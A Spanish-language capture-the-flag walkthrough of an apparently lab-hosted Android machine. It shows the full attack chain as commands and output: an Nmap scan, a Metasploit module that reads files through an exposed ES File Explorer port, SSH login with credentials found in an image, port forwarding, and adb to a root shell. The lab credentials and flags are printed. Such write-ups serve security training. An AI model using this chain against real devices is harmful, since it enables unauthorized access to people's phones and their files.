>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/explore]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.6.29       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 14:04 EST
Nmap scan report for 10.129.6.29
Host is up (0.060s latency).
Not shown: 63591 closed tcp ports (reset), 1940 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     Banana Studio SSH server app (net.xnano.android.sshserver.tv) (protocol 2.0)
42135/tcp open  http    ES File Explorer Name Response httpd
42483/tcp open  unknown
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
```

>Al ver abierto un puerto con el servicio de **ES File Explorer mediante http** podemos enumerarlo con el siguiente módulo de **metasploit**, en este caso, vamos a **listar las imágenes** y vemos una que habla de credenciales:

```bash
msf auxiliary(scanner/http/es_file_explorer_open_port) > set RHOST 10.129.6.29
RHOST => 10.129.6.29
msf auxiliary(scanner/http/es_file_explorer_open_port) > set ACTION LISTPICS 
ACTION => LISTPICS
msf auxiliary(scanner/http/es_file_explorer_open_port) > run
WARNING:  database "msf" has a collation version mismatch
DETAIL:  The database was created using collation version 2.38, but the operating system provides version 2.41.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
[+] 10.129.6.29:59777    
  concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg
  anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png
  creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg
  224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

>Vamos a descargar esa imagen:

```bash
msf auxiliary(scanner/http/es_file_explorer_open_port) > set ACTION GETFILE 
ACTION => GETFILE
msf auxiliary(scanner/http/es_file_explorer_open_port) > set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
ACTIONITEM => /storage/emulated/0/DCIM/creds.jpg
msf auxiliary(scanner/http/es_file_explorer_open_port) > run
[+] 10.129.6.29:59777    - /storage/emulated/0/DCIM/creds.jpg saved to /home/kali/.msf4/loot/20260214141143_default_10.129.6.29_getFile_742816.jpg
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
<img width="502" height="425" alt="image" src="https://github.com/user-attachments/assets/0ed685a6-0a89-4827-b3b1-389d7830068b" />

>Vemos en la imagen las credenciales `kristi:Kr1sT!5h@Rp3xPl0r3!`, vamos a probarlas para el ssh:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/explore]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa kristi@10.129.6.29 -p 2222
The authenticity of host '[10.129.6.29]:2222 ([10.129.6.29]:2222)' can't be established.
RSA key fingerprint is: SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.6.29]:2222' (RSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Password authentication
(kristi@10.129.6.29) Password: 
:/ $ whoami 
u0_a76
```

>Leemos la user flag que está en `/storage/emulated/0`:

```bash
:/storage/emulated/0 $ cat user.txt
f32017174c7c7e8f50c6da52891ae250
```

>Si vemos los servicios runeando vemos en el puerto **5555 TCP** el servicio **Android Debug Bridge** que mediante el binario **adb** podremos ganar acceso privilegiado al sistema:

```bash
:/storage/emulated/0 $ ss -ntlp
State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN      0      8       [::ffff:127.0.0.1]:41319                    *:*                  
LISTEN      0      50           *:2222                     *:*                   users:(("ss",pid=18420,fd=78),("sh",pid=17658,fd=78),("droid.sshserver",pid=6274,fd=78))
LISTEN      0      4            *:5555                     *:*                  
LISTEN      0      10           *:42135                    *:*                  
LISTEN      0      50        [::ffff:10.129.6.29]:34459                    *:*                  
LISTEN      0      50           *:59777                    *:*         
```

>Nos traemos el puerto mediante **port forwarding**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/explore]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -L 5555:127.0.0.1:5555 kristi@10.129.6.29 -p 2222
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Password authentication
(kristi@10.129.6.29) Password: 
:/ $
```

>Usamos el binario de **adb** para conectarnos al dispositivo y ganamos una shell como root, leyendo la flag final:

```bash
┌──(kali㉿jbkira)-[~]
└─$ adb connect 127.0.0.1:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 127.0.0.1:5555

┌──(kali㉿jbkira)-[~]
└─$ adb -s 127.0.0.1:5555 root
restarting adbd as root
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~]
└─$ adb -s 127.0.0.1:5555 shell
x86_64:/ # whoami                                                                                                                                                                            
root
x86_64:/ # cat /data/root.txt 
f04fc82b6d49b41c9b08982be59338c5
```

